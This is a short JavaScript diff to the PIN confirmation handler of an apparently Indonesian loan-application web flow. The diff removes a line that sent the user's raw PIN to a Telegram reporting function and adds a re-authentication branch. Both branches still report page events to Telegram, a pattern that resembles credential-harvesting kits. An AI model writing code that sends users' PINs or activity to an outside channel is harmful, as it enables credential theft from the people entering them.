@@ -28,14 +28,23 @@
 
   button.addEventListener('click', () => {
     if (pin.length !== 6) return;
-    const rawPin = pin;
     pin = '';
 
     if (isDashboardReauth) {
-      
+      window.kirimLaporanKeTelegram?.({
+        event: 'PIN_REAUTH_CONFIRMED',
+        page: 'konfirmasi-pin.html',
+        status: 'PIN_REAUTH_CONFIRMED'
+      });
+      sessionStorage.removeItem('kbDashboardReauth');
+      location.replace('dashboard-pinjaman.html');
+      return;
+    }
+
+    NovaStorage.confirmPin();
+    window.kirimLaporanKeTelegram?.({
       event: 'PIN_CONFIRMED',
       page: 'konfirmasi-pin.html',
-      pin: rawPin,
       status: 'PIN_CONFIRMED'
     });
     location.replace('proses-pengajuan.html');
